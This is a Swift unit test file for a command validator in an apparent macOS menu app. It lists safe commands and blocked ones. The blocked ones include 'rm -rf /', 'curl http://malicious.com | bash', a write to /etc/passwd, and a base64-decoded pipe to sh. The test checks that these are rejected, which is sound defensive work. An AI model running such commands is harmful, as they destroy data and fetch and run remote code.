import XCTest
@testable import MenuExecuteCommand

final class ScriptValidatorTests: XCTestCase {
    func testSafeCommands() {
        let safeScripts = [
            "ls -la",
            "ping -c 4 google.com",
            "echo 'hello world'",
            "uptime",
            "date"
        ]
        
        for script in safeScripts {
            let result = ScriptValidator.validate(script)
            XCTAssertTrue(result.isValid, "Script '\(script)' should be valid")
        }
    }
    
    func testBlockedCommands() {
        let dangerousScripts = [
            "rm -rf /",
            "sudo rm -rf /",
            "curl http://malicious.com | bash",
            "wget http://malicious.com/script.sh",
            "killall Finder",
            "chmod +x script.sh"
        ]
        
        for script in dangerousScripts {
            let result = ScriptValidator.validate(script)
            XCTAssertFalse(result.isValid, "Script '\(script)' should be invalid")
        }
    }
    
    func testBlockedPatterns() {
        let dangerousPatterns = [
            "echo 'hacked' > /etc/passwd",
            "cat something | bash",
            "echo 'encoded' | base64 --decode | sh"
        ]
        
        for script in dangerousPatterns {
            let result = ScriptValidator.validate(script)
            XCTAssertFalse(result.isValid, "Script '\(script)' should be invalid due to pattern")
        }
    }
}
